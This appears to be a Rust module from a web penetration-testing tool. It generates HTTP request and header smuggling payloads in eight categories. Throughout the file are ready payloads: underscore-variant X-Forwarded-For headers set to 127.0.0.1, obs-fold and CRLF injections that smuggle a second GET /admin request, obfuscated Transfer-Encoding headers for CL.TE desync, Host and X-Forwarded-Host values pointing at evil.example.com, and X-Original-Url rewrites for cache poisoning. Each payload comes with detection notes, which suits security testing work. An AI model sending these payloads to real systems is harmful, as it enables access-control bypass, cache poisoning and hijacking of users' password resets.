use std::fmt;

/// Broad categories of header smuggling technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SmuggleTechnique {
    HeaderNameNormalization,
    LineFolding,
    SpaceBeforeColon,
    DuplicateHeader,
    OversizedHeader,
    TransferEncodingObfuscation,
    HostHeaderAttack,
    CacheKeyManipulation,
}

impl fmt::Display for SmuggleTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::HeaderNameNormalization => write!(f, "header-name-normalization"),
            Self::LineFolding => write!(f, "obs-fold-line-continuation"),
            Self::SpaceBeforeColon => write!(f, "space-before-colon"),
            Self::DuplicateHeader => write!(f, "duplicate-header"),
            Self::OversizedHeader => write!(f, "oversized-header"),
            Self::TransferEncodingObfuscation => write!(f, "transfer-encoding-obfuscation"),
            Self::HostHeaderAttack => write!(f, "host-header-attack"),
            Self::CacheKeyManipulation => write!(f, "cache-key-manipulation"),
        }
    }
}

/// Describes how a front-end vs back-end might differ in header resolution.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum DuplicateResolution {
    FirstWins,
    LastWins,
    Concatenated,
    Rejected,
}

impl fmt::Display for DuplicateResolution {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::FirstWins => write!(f, "first-wins"),
            Self::LastWins => write!(f, "last-wins"),
            Self::Concatenated => write!(f, "concatenated"),
            Self::Rejected => write!(f, "rejected"),
        }
    }
}

/// Single smuggling payload with detection guidance.
#[derive(Debug, Clone)]
pub struct HeaderSmugglePayload {
    pub technique: SmuggleTechnique,
    pub headers: Vec<(String, String)>,
    pub raw_suffix: Option<String>,
    pub description: String,
    pub detection_method: String,
    pub risk: SmuggleRisk,
}

/// Impact classification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SmuggleRisk {
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for SmuggleRisk {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Low => write!(f, "low"),
            Self::Medium => write!(f, "medium"),
            Self::High => write!(f, "high"),
            Self::Critical => write!(f, "critical"),
        }
    }
}

/// Result of fingerprinting duplicate-header handling.
#[derive(Debug, Clone)]
pub struct DuplicateHeaderFingerprint {
    pub header_name: String,
    pub resolution: DuplicateResolution,
    pub evidence: String,
}

/// Host-header attack sub-variant.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum HostAttackVariant {
    DuplicateHost,
    AbsoluteUri,
    HostLineInjection,
    XForwardedHostOverride,
    HostPortInjection,
}

impl fmt::Display for HostAttackVariant {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::DuplicateHost => write!(f, "duplicate-host"),
            Self::AbsoluteUri => write!(f, "absolute-uri-override"),
            Self::HostLineInjection => write!(f, "host-line-injection"),
            Self::XForwardedHostOverride => write!(f, "x-forwarded-host-override"),
            Self::HostPortInjection => write!(f, "host-port-injection"),
        }
    }
}

/// Host header attack payload.
#[derive(Debug, Clone)]
pub struct HostAttackPayload {
    pub variant: HostAttackVariant,
    pub headers: Vec<(String, String)>,
    pub absolute_uri: Option<String>,
    pub description: String,
    pub detection_method: String,
}

/// Core engine for generating header smuggling payloads.
pub struct HeaderSmugglingEngine;

impl HeaderSmugglingEngine {
    /// Generates payloads across all eight technique categories.
    pub fn generate_all_payloads(target: &str) -> Vec<HeaderSmugglePayload> {
        let mut payloads = Vec::new();
        payloads.extend(Self::header_name_normalization_payloads());
        payloads.extend(Self::line_folding_payloads());
        payloads.extend(Self::space_before_colon_payloads());
        payloads.extend(Self::duplicate_header_payloads());
        payloads.extend(Self::oversized_header_payloads());
        payloads.extend(Self::transfer_encoding_obfuscation_payloads());
        payloads.extend(Self::host_header_payloads(target));
        payloads.extend(Self::cache_key_manipulation_payloads(target));
        payloads
    }

    /// Technique 1: Header name normalization discrepancies.
    /// Proxies may normalize underscores to hyphens (or vice versa), letting
    /// an attacker slip a second identity through the same semantic header.
    pub fn header_name_normalization_payloads() -> Vec<HeaderSmugglePayload> {
        let pairs: &[(&str, &str, &str)] = &[
            (
                "X-Forwarded-For",
                "X_Forwarded_For",
                "underscore vs hyphen in forwarded IP",
            ),
            (
                "X-Forwarded-For",
                "X-Forwarded_For",
                "mixed separator in forwarded IP",
            ),
            ("X-Real-Ip", "X_Real_Ip", "underscore variant of X-Real-Ip"),
        ];

        pairs
            .iter()
            .map(|(canonical, variant, desc)| HeaderSmugglePayload {
                technique: SmuggleTechnique::HeaderNameNormalization,
                headers: vec![
                    (canonical.to_string(), "198.51.100.1".into()),
                    (variant.to_string(), "127.0.0.1".into()),
                ],
                raw_suffix: None,
                description: desc.to_string(),
                detection_method: "Send both header forms with distinct values. If the \
                    application responds to the variant value (e.g. grants localhost access), \
                    the proxy normalizes differently from the backend."
                    .into(),
                risk: SmuggleRisk::High,
            })
            .collect()
    }

    /// Technique 2: obs-fold line continuation (RFC 7230 §3.2.4 deprecated but
    /// still parsed by many implementations).
    pub fn line_folding_payloads() -> Vec<HeaderSmugglePayload> {
        vec![
            HeaderSmugglePayload {
                technique: SmuggleTechnique::LineFolding,
                headers: vec![],
                raw_suffix: Some(
                    "X-Injected: safe\r\n \r\nGET /admin HTTP/1.1\r\nHost: localhost".into(),
                ),
                description: "obs-fold CRLF+SP to inject secondary request line".into(),
                detection_method: "Check if response contains admin page content or a \
                    second response boundary; the server treated the folded continuation \
                    as a new request."
                    .into(),
                risk: SmuggleRisk::Critical,
            },
            HeaderSmugglePayload {
                technique: SmuggleTechnique::LineFolding,
                headers: vec![],
                raw_suffix: Some("X-Custom: value1\r\n\tvalue2-injected".into()),
                description: "obs-fold CRLF+HTAB to append hidden header value".into(),
                detection_method: "Reflect the header back; if both value1 and \
                    value2-injected appear as a single header value, the server \
                    supports obs-fold."
                    .into(),
                risk: SmuggleRisk::Medium,
            },
        ]
    }

    /// Technique 3: Space before colon changes header parsing in some stacks.
    pub fn space_before_colon_payloads() -> Vec<HeaderSmugglePayload> {
        vec![
            HeaderSmugglePayload {
                technique: SmuggleTechnique::SpaceBeforeColon,
                headers: vec![
                    ("Transfer-Encoding".into(), "chunked".into()),
                    ("Transfer-Encoding ".into(), "identity".into()),
                ],
                raw_suffix: None,
                description: "trailing space in Transfer-Encoding header name".into(),
                detection_method: "Send both forms. If the proxy sees 'chunked' but the \
                    origin sees 'identity' (or ignores the spaced form), request body \
                    parsing diverges."
                    .into(),
                risk: SmuggleRisk::Critical,
            },
            HeaderSmugglePayload {
                technique: SmuggleTechnique::SpaceBeforeColon,
                headers: vec![("Content-Length ".into(), "0".into())],
                raw_suffix: None,
                description: "trailing space in Content-Length header name".into(),
                detection_method: "If the backend ignores the spaced Content-Length but \
                    the proxy honours it, the body boundary shifts."
                    .into(),
                risk: SmuggleRisk::High,
            },
        ]
    }

    /// Technique 4: Duplicate header handling discrepancies.
    pub fn duplicate_header_payloads() -> Vec<HeaderSmugglePayload> {
        let test_headers: &[&str] = &[
            "X-Forwarded-For",
            "X-Forwarded-Host",
            "Authorization",
            "Cookie",
        ];

        test_headers
            .iter()
            .map(|name| HeaderSmugglePayload {
                technique: SmuggleTechnique::DuplicateHeader,
                headers: vec![
                    (name.to_string(), "value-first".into()),
                    (name.to_string(), "value-second".into()),
                ],
                raw_suffix: None,
                description: format!(
                    "duplicate {name} — detect first-wins vs last-wins vs concatenation"
                ),
                detection_method: format!(
                    "Send two {name} headers with distinct marker values. Inspect which \
                     value the application uses. If a proxy picks first-wins and the backend \
                     picks last-wins, inject the attacker value in the winning position."
                ),
                risk: SmuggleRisk::High,
            })
            .collect()
    }

    /// Technique 5: Oversized headers trigger fallback/error parsing.
    pub fn oversized_header_payloads() -> Vec<HeaderSmugglePayload> {
        let sizes: &[(usize, &str)] = &[
            (8 * 1024, "8 KB header — typical proxy limit"),
            (16 * 1024, "16 KB header — nginx default limit"),
            (64 * 1024, "64 KB header — exceeds most HTTP/1.1 parsers"),
        ];

        sizes
            .iter()
            .map(|(size, desc)| {
                let filler = "A".repeat(*size);
                HeaderSmugglePayload {
                    technique: SmuggleTechnique::OversizedHeader,
                    headers: vec![("X-Oversized".into(), filler)],
                    raw_suffix: None,
                    description: desc.to_string(),
                    detection_method: "Compare response code/body between normal and \
                        oversized requests. A 400 from the proxy but 200 from direct \
                        backend indicates the proxy truncates or rejects, while the \
                        backend processes a mutated request."
                        .into(),
                    risk: SmuggleRisk::Medium,
                }
            })
            .collect()
    }

    /// Technique 6: Transfer-Encoding header obfuscation to create CL.TE/TE.CL
    /// discrepancies without modifying smuggling_engine.rs.
    pub fn transfer_encoding_obfuscation_payloads() -> Vec<HeaderSmugglePayload> {
        let variants: Vec<(String, &str)> = vec![
            (
                "Transfer-Encoding: chunked".into(),
                "standard chunked (baseline)",
            ),
            ("Transfer-Encoding : chunked".into(), "space before colon"),
            (
                "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity".into(),
                "duplicate TE with identity fallback",
            ),
            ("Transfer-Encoding:\tchunked".into(), "tab after colon"),
            (
                "Transfer-Encoding: \x0bchunked".into(),
                "vertical tab prefix in value",
            ),
            (
                "Transfer-Encoding: chunked\r\n X: ignore".into(),
                "obs-fold after TE header",
            ),
        ];

        variants
            .into_iter()
            .map(|(raw, desc)| HeaderSmugglePayload {
                technique: SmuggleTechnique::TransferEncodingObfuscation,
                headers: vec![],
                raw_suffix: Some(raw),
                description: desc.into(),
                detection_method: "Pair with a Content-Length header. If the proxy uses CL \
                    but the backend uses the obfuscated TE (or vice versa), the request body \
                    boundary diverges — confirmed via timing difference or reflected content."
                    .into(),
                risk: SmuggleRisk::Critical,
            })
            .collect()
    }

    /// Technique 7: Host header attacks (≥5 variants required).
    pub fn host_header_payloads(target: &str) -> Vec<HeaderSmugglePayload> {
        Self::generate_host_attacks(target)
            .into_iter()
            .map(|h| HeaderSmugglePayload {
                technique: SmuggleTechnique::HostHeaderAttack,
                headers: h.headers.clone(),
                raw_suffix: h.absolute_uri.clone(),
                description: h.description.clone(),
                detection_method: h.detection_method.clone(),
                risk: SmuggleRisk::High,
            })
            .collect()
    }

    /// Technique 8: Cache key manipulation via normalization differences.
    pub fn cache_key_manipulation_payloads(target: &str) -> Vec<HeaderSmugglePayload> {
        let evil = "evil.example.com";
        vec![
            HeaderSmugglePayload {
                technique: SmuggleTechnique::CacheKeyManipulation,
                headers: vec![
                    ("Host".into(), target.into()),
                    ("X-Forwarded-Host".into(), evil.into()),
                ],
                raw_suffix: None,
                description: "X-Forwarded-Host override for cache poisoning".into(),
                detection_method: "Request a cacheable resource with the injected \
                    X-Forwarded-Host. If the cached response contains links/redirects \
                    pointing to evil.example.com, the cache key excluded X-Forwarded-Host."
                    .into(),
                risk: SmuggleRisk::High,
            },
            HeaderSmugglePayload {
                technique: SmuggleTechnique::CacheKeyManipulation,
                headers: vec![
                    ("Host".into(), target.into()),
                    ("X-Original-Url".into(), "/admin".into()),
                ],
                raw_suffix: None,
                description: "X-Original-Url rewrite for cache path confusion".into(),
                detection_method: "Request / with X-Original-Url: /admin. If admin page \
                    content is returned and subsequently served from cache for /, the \
                    cache keys on the path but the backend honours X-Original-Url."
                    .into(),
                risk: SmuggleRisk::Critical,
            },
            HeaderSmugglePayload {
                technique: SmuggleTechnique::CacheKeyManipulation,
                headers: vec![
                    ("Host".into(), target.into()),
                    ("X-Rewrite-Url".into(), "/admin".into()),
                ],
                raw_suffix: None,
                description: "X-Rewrite-Url for IIS-style cache confusion".into(),
                detection_method: "Same as X-Original-Url but using X-Rewrite-Url which \
                    IIS/ASP.NET honours. Compare response body between normal and injected."
                    .into(),
                risk: SmuggleRisk::High,
            },
        ]
    }

    /// Generate ≥5 host header attack variants.
    pub fn generate_host_attacks(target: &str) -> Vec<HostAttackPayload> {
        let evil = "evil.example.com";
        vec![
            HostAttackPayload {
                variant: HostAttackVariant::DuplicateHost,
                headers: vec![("Host".into(), target.into()), ("Host".into(), evil.into())],
                absolute_uri: None,
                description: "Duplicate Host headers — first-wins vs last-wins routing".into(),
                detection_method: "If the response routes to evil.example.com content \
                    or the backend returns a different virtual host, the proxy and backend \
                    disagree on which Host value wins."
                    .into(),
            },
            HostAttackPayload {
                variant: HostAttackVariant::AbsoluteUri,
                headers: vec![("Host".into(), target.into())],
                absolute_uri: Some(format!("GET http://{evil}/ HTTP/1.1")),
                description: "Absolute URI overrides Host header (RFC 7230 §5.4)".into(),
                detection_method: "Send an absolute URI targeting evil.example.com with \
                    a Host header for the real target. If the backend routes to \
                    evil.example.com, it prefers the request-line URI over Host."
                    .into(),
            },
            HostAttackPayload {
                variant: HostAttackVariant::HostLineInjection,
                headers: vec![("Host".into(), format!("{target}\r\nX-Injected: true"))],
                absolute_uri: None,
                description: "CRLF injection inside Host value to smuggle arbitrary header".into(),
                detection_method: "If the response reflects X-Injected or the backend \
                    processes it, the Host field was not sanitised for CRLF."
                    .into(),
            },
            HostAttackPayload {
                variant: HostAttackVariant::XForwardedHostOverride,
                headers: vec![
                    ("Host".into(), target.into()),
                    ("X-Forwarded-Host".into(), evil.into()),
                ],
                absolute_uri: None,
                description: "X-Forwarded-Host trusted by backend for routing/link \
                    generation"
                    .into(),
                detection_method: "Check if response contains links, redirects, or \
                    password-reset URLs pointing at evil.example.com."
                    .into(),
            },
            HostAttackPayload {
                variant: HostAttackVariant::HostPortInjection,
                headers: vec![("Host".into(), format!("{target}:@{evil}"))],
                absolute_uri: None,
                description: "Host with embedded credentials/port to confuse URL parsers".into(),
                detection_method: "Some URL parsers treat user:@host as credentials. If \
                    the backend resolves the host portion as evil.example.com, the port \
                    injection succeeded."
                    .into(),
            },
        ]
    }

    /// Fingerprint how a target handles duplicate instances of a header.
    /// Returns a classification per tested header based on which marker value
    /// appears in the reflected response.
    pub fn fingerprint_duplicate_handling(
        header_name: &str,
        response_body: &str,
    ) -> DuplicateHeaderFingerprint {
        let has_first = response_body.contains("value-first");
        let has_second = response_body.contains("value-second");

        let (resolution, evidence) = match (has_first, has_second) {
            (true, true) => (
                DuplicateResolution::Concatenated,
                "Both marker values present — server concatenates duplicate headers",
            ),
            (true, false) => (
                DuplicateResolution::FirstWins,
                "Only first marker value present — server uses first occurrence",
            ),
            (false, true) => (
                DuplicateResolution::LastWins,
                "Only second marker value present — server uses last occurrence",
            ),
            (false, false) => (
                DuplicateResolution::Rejected,
                "Neither marker value present — server likely rejected or dropped duplicates",
            ),
        };

        DuplicateHeaderFingerprint {
            header_name: header_name.to_string(),
            resolution,
            evidence: evidence.into(),
        }
    }

    /// Count total unique techniques covered by a payload set.
    pub fn technique_coverage(payloads: &[HeaderSmugglePayload]) -> usize {
        let mut seen = std::collections::HashSet::new();
        for p in payloads {
            seen.insert(p.technique);
        }
        seen.len()
    }

    /// Filter payloads by minimum risk level.
    pub fn payloads_at_risk(
        payloads: &[HeaderSmugglePayload],
        min_risk: SmuggleRisk,
    ) -> Vec<&HeaderSmugglePayload> {
        let threshold = risk_ordinal(min_risk);
        payloads
            .iter()
            .filter(|p| risk_ordinal(p.risk) >= threshold)
            .collect()
    }
}

fn risk_ordinal(r: SmuggleRisk) -> u8 {
    match r {
        SmuggleRisk::Low => 0,
        SmuggleRisk::Medium => 1,
        SmuggleRisk::High => 2,
        SmuggleRisk::Critical => 3,
    }
}
